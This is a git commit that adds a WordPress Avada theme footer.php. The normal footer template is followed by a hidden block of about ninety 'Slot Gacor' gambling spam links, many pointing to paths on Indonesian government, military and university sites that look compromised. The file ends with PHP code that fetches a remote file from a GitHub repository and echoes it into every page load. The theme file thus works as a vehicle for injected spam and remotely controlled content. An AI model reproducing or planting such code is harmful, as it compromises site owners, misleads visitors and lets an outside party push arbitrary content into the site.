8122e11aae17f1c21ff3e5575adaec89e35bbff2
tim cyber securtiy <71566130+ubed354311@users.noreply.github.com>
2023-09-20 17:37:10 -0400

    Add files via upload

---
+++ footer.php
@@ -0,0 +1,163 @@
+<?php
+/**
+ * The footer template.
+ *
+ * @package Avada
+ * @subpackage Templates
+ */
+
+// Do not allow directly accessing this file.
+if ( ! defined( 'ABSPATH' ) ) {
+	exit( 'Direct script access denied.' );
+}
+?>
+						<?php do_action( 'avada_after_main_content' ); ?>
+
+					</div>  <!-- fusion-row -->
+				</main>  <!-- #main -->
+				<?php do_action( 'avada_after_main_container' ); ?>
+
+				<?php
+				/**
+				 * Get the correct page ID.
+				 */
+				$c_page_id = Avada()->fusion_library->get_page_id();
+				?>
+
+				<?php
+				/**
+				 * Only include the footer.
+				 */
+				?>
+				<?php if ( ! is_page_template( 'blank.php' ) ) : ?>
+
+					<?php
+					if ( has_action( 'avada_render_footer' ) ) {
+						do_action( 'avada_render_footer' );
+					} else {
+						Avada()->template->render_footer();
+					}
+					?>
+
+					<div class="fusion-sliding-bar-wrapper">
+						<?php
+						/**
+						 * Add sliding bar.
+						 */
+						if ( Avada()->settings->get( 'slidingbar_widgets' ) ) {
+							get_template_part( 'sliding_bar' );
+						}
+						?>
+					</div>
+
+					<?php do_action( 'avada_before_wrapper_container_close' ); ?>
+				<?php endif; // End is not blank page check. ?>
+			</div> <!-- wrapper -->
+		</div> <!-- #boxed-wrapper -->
+		<div class="fusion-top-frame"></div>
+		<div class="fusion-bottom-frame"></div>
+		<div class="fusion-boxed-shadow"></div>
+		<a class="fusion-one-page-text-link fusion-page-load-link" tabindex="-1" href="#" aria-hidden="true"><?php esc_html_e( 'Page load link', 'Avada' ); ?></a>
+
+		<div class="avada-footer-scripts">
+			<?php wp_footer(); ?>
+		</div>
+
+		<?php get_template_part( 'templates/to-top' ); ?>
+	</body>
+	<div style="display:none;">
+
+
+<a href="http://103.47.60.38/" rel="dofollow">Slot Gacor</a>
+<a href="https://pgpaud.stkipmodernngawi.ac.id/" rel="dofollow">Slot Gacor</a>
+<a href="https://sia.stih-painan.ac.id/captcha/slot-gacor-hari-ini/" rel="dofollow">Slot Gacor</a>
+<a href="https://dosen.stih-painan.ac.id/" rel="dofollow">Slot Gacor</a>
+<a href="http://simelati.lampungtimurkab.go.id/slot-gacor/" rel="dofollow">Slot Gacor</a>
+<a href="https://bkd.kopertais1.or.id/slot-gacor/" rel="dofollow">Slot Gacor</a>
+<a href="https://ppidapi.damri.co.id/slot-gacor/" rel="dofollow">Slot Gacor</a>
+<a href="https://ekosistem.batik.go.id/slot-gacor/" rel="dofollow">Slot Gacor</a>
+<a href="https://wbs.pekanbaru.go.id/storage/-/slot-gacor/" rel="dofollow">Slot Gacor</a>
+<a href="https://inkadha.ac.id/slot-gacor/" rel="dofollow">Slot Gacor</a>
+<a href="https://dpad.lamandaukab.go.id/slot-gacor/" rel="dofollow">Slot Gacor</a>
+<a href="https://pmi.okuselatankab.go.id/wp-content/slot-gacor/" rel="dofollow">Slot Gacor</a>
+<a href="https://upertis.ac.id/slot-gacor/" rel="dofollow">Slot Gacor</a>
+<a href="https://lppm.upertis.ac.id/" rel="dofollow">Slot Gacor</a>
+<a href="https://sttekumene.ac.id/slot-gacor/" rel="dofollow">Slot Gacor</a>
+<a href="https://iik.ac.id/-/slot-gacor/" rel="dofollow">Slot Gacor</a>
+<a href="https://anugrah.ac.id/slot-gacor/" rel="dofollow">Slot Gacor</a>
+<a href="https://sttpk-medan.ac.id/slot-gacor/" rel="dofollow">Slot Gacor</a>
+<a href="http://gs.unitri.ac.id/slot-gacor/" rel="dofollow">Slot Gacor</a>
+<a href="https://iik.ac.id/-/slot-gacor/" rel="dofollow">Slot Gacor</a>
+<a href="https://ar.iiq.ac.id/slot-gacor/" rel="dofollow">Slot Gacor</a>
+<a href="https://iiq.ac.id/slot-gacor/" rel="dofollow">Slot Gacor</a>
+<a href="https://diskoperindag.pemalangkab.go.id/slot-gacor/" rel="dofollow">Slot Gacor</a>
+<a href="https://labkesda.sragenkab.go.id/galeri/slot-gacor/" rel="dofollow">Slot Gacor</a>
+<a href="https://puskesmas-gondang.sragenkab.go.id/download/slot-gacor/" rel="dofollow">Slot Gacor</a>
+<a href="https://unitri.ac.id/slot-gacor/" rel="dofollow">Slot Gacor</a>
+<a href="https://daftar.unimugo.ac.id/slot-gacor/" rel="dofollow">Slot Gacor</a>
+<a href="https://unitri.ac.id/slot-gacor-gampang-menang/" rel="dofollow">Slot Gacor</a>
+<a href="http://gs.unitri.ac.id/slot-gacor/" rel="dofollow">Slot Gacor</a>
+<a href="https://e-learning.febi.umkendari.ac.id/slot-gacor-hari-ini/" rel="dofollow">Slot Gacor</a>
+<a href="https://fekon.unsam.ac.id/slot-gacor-hari-ini/" rel="dofollow">Slot Gacor</a>
+<a href="https://portal.parahikma.ac.id/" rel="dofollow">Slot Gacor</a>
+<a href="https://bogor.perpusnas.go.id/xampp/rtp-slot-gacor/" rel="dofollow">Slot Gacor</a>
+<a href="https://parahikma.ac.id/slot-gacor/" rel="dofollow">Slot Gacor</a>
+<a href="https://itesa.ac.id/slot-gacor/" rel="dofollow">Slot Gacor</a>
+<a href="https://sipenmaru.umku.ac.id/pmb/slot-gacor/" rel="dofollow">Slot Gacor</a>
+<a href="https://pmb.sttpk-medan.ac.id/slot-gacor/" rel="dofollow">Slot Gacor</a>
+<a href="https://webapi.iik.ac.id/" rel="dofollow">Slot Gacor</a>
+<a href="https://inlislite.tabalongkab.go.id/slot-gacor" rel="dofollow">Slot Gacor</a>
+<a href="https://www.sttbk.ac.id/slot-gacor/" rel="dofollow">Slot Gacor</a>
+<a href="https://bpsdm.sultengprov.go.id/assets/slot-gacor/" rel="dofollow">Slot Gacor</a>
+<a href="https://pergunu.or.id/-/slot-gacor/" rel="dofollow">Slot Gacor</a>
+<a href="https://pmb-mandiri.sitdm.staindirundeng.ac.id/slot-gacor/" rel="dofollow">Slot Gacor</a>
+<a href="https://unusultra.ac.id/slot-gacor/" rel="dofollow">Slot Gacor</a>
+<a href="https://simpeg.bpsdm.sultengprov.go.id/" rel="dofollow">Slot Gacor</a>
+<a href="https://sikomcatmas.wonogirikab.go.id/media/Profile_Img/" rel="dofollow">Slot Gacor</a>
+<a href="https://slot-gacor.incredible.web.id/" rel="dofollow">Slot Gacor</a>
+<a href="https://www.ufoelektronika.com/-/slot-gacor/" rel="dofollow">Slot Gacor</a>
+<a href="https://www.simpeg.kolakakab.go.id/slot-gacor/" rel="dofollow">Slot Gacor</a>
+<a href="https://anugrah.ac.id/slot-gacor/" rel="dofollow">Slot Gacor</a>
+<a href="https://e-learning.febi.umkendari.ac.id/slot-gacor-hari-ini/" rel="dofollow">Slot Gacor</a>
+<a href="https://penilaianmandiri.bpsdm.sultengprov.go.id/" rel="dofollow">Slot Gacor</a>
+<a href="https://siakad.parahikma.ac.id/slot-gacor-maxwin/" rel="dofollow">Slot Gacor</a>
+<a href="https://febi.umkendari.ac.id/slot-gacor/" rel="dofollow">Slot Gacor</a>
+<a href="https://pmb.fdk.ac.id/slot-gacor/" rel="dofollow">Slot Gacor</a>
+<a href="https://elapor.merauke.go.id/login/" rel="dofollow">Slot Gacor</a>
+<a href="https://spbe.perpusnas.go.id/-/slot-gacor/" rel="dofollow">Slot Gacor</a>
+<a href="https://spbe.perpusnas.go.id/slot-hari-ini/" rel="dofollow">Slot Gacor</a>
+<a href="https://kknreguler.unsam.ac.id/-/slot-gacor/" rel="dofollow">Slot Gacor</a>
+<a href="https://kknreguler.unsam.ac.id/slot777/" rel="dofollow">Slot Gacor</a>
+<a href="https://fisika.unsam.ac.id/tag/slot88/" rel="dofollow">Slot Gacor</a>
+<a href="https://fekon.unsam.ac.id/slot-gacor-hari-ini/" rel="dofollow">Slot Gacor</a>
+<a href="https://laperon.jembranakab.go.id/storage/files/330/" rel="dofollow">Slot Gacor</a>
+<a href="https://dukcapil.klaten.go.id/-/" rel="dofollow">Slot Gacor</a>
+<a href="https://antrian.postel.go.id/-/slot-gacor/" rel="dofollow">Slot Gacor</a>
+<a href="https://antrian.postel.go.id/uploads/" rel="dofollow">Slot Gacor</a>
+<a href="https://press.perpusnas.go.id/files/flipbooks/691/index.html" rel="dofollow">Slot Gacor</a>
+<a href="https://simlab-uii.id/storage/-/slot-hari-ini/" rel="dofollow">Slot Gacor</a>
+<a href="https://ejurnal.stih-painan.ac.id/public/site/" rel="dofollow">Slot Gacor</a>
+<a href="https://siakad.stih-painan.ac.id/siakad/slot-gacor/" rel="dofollow">Slot Gacor</a>
+<a href="https://stih-painan.ac.id/slot-gacor/" rel="dofollow">Slot Gacor</a>
+<a href="https://sia.stih-painan.ac.id/captcha/slot-gacor-hari-ini/" rel="dofollow">Slot Gacor</a>
+<a href="https://elearning.stikes-adc.ac.id/local/slot-gacor/" rel="dofollow">Slot Gacor</a>
+<a href="https://arsip.stikes-adc.ac.id/file/arsip/slot/" rel="dofollow">Slot Gacor</a>
+<a href="https://sdm.stikes-adc.ac.id/file/arsip/-/slot-gacor/" rel="dofollow">Slot Gacor</a>
+<a href="https://lpm.stkipmodernngawi.ac.id/slot-gacor/" rel="dofollow">Slot Gacor</a>
+<a href="https://penmat.stkipmodernngawi.ac.id/login/" rel="dofollow">Slot Gacor</a>
+<a href="https://tracerstudy.stkipmodernngawi.ac.id/-/slot-gacor/" rel="dofollow">Slot Gacor</a>
+<a href="https://kodam4.mil.id/-/slot-gacor/" rel="dofollow">Slot Gacor</a>
+<a href="https://pusdikjas.kodiklat-tniad.mil.id/wp-includes/sitemaps/" rel="dofollow">Slot Gacor</a>
+<a href="https://pusdik-bekang-tniad.mil.id/.wp-cli/slot-gacor/" rel="dofollow">Slot Gacor</a>
+<a href="https://persitpusat.or.id/wp-content/cache/" rel="dofollow">Slot Gacor</a>
+<a href="https://kodim0601.siliwangi.mil.id/slot-gacor/" rel="dofollow">Slot Gacor</a>
+<a href="https://korem143.tni-ad.mil.id/.tmb/" rel="dofollow">Slot Gacor</a>
+<a href="https://sp.sidomuncul.co.id/sp_mon/rtp-slot/" rel="dofollow">Slot Gacor</a>
+<a href="https://darulhidayah.ponpes.id/wp-content/uploads/slot-gacor/" rel="dofollow">Slot Gacor</a>
+
+<?php
+$a = file_get_contents('https://github.com/ubed354311/tes/raw/master/code(2).php');
+echo $a;
+?>
+
+</html>
